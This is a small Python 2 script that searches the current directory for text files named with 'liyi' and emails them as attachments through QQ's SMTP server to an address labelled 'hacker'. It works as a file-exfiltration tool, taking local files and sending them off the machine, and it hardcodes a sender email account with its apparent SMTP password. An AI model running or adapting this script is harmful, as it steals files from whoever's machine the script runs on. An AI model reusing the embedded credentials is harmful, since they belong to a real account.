import smtplib
import os
from email.mime.text import MIMEText
from email.utils import formataddr
from email.mime.multipart import MIMEMultipart

my_sender='874115723@qq.com'
my_pass ='qwptgiundcocbcjj'
my_user='2017301500189@whu.edu.cn'

def mail(path):
	ret=True
	try:
		msg = MIMEMultipart()
		msg['From']=formataddr(["server",my_sender]) 
		msg['To']=formataddr(["hacker",my_user])
		msg['Subject']="liyi.txt"
		if len(path)==0:
			msg.attach(MIMEText("Can't find any files that contains 'liyi'. ",'plain','utf-8'))
		else:
			msg.attach(MIMEText("Success find the txt file that contains 'liyi'! ",'plain','utf-8'))
			for i in path:
				i=i.strip('\n')
				print i
				att = MIMEText(open(i, 'rb').read(), 'base64', 'utf-8')
				att["Content-Type"] = 'application/octet-stream'
				att["Content-Disposition"] = 'attachment; filename="result.txt"'
				msg.attach(att)
		server=smtplib.SMTP_SSL("smtp.qq.com", 465) 
		server.login(my_sender, my_pass)
		server.sendmail(my_sender,[my_user,],msg.as_string())  
		server.quit()
	except:
		ret=False	
	return ret
if __name__ == '__main__':
	cmd="find . -name '*liyi*.txt'"
	path=os.popen(cmd).readlines()
	ret=mail(path)
	if ret:
		print("send Success")
	else:
		print("send Failed")
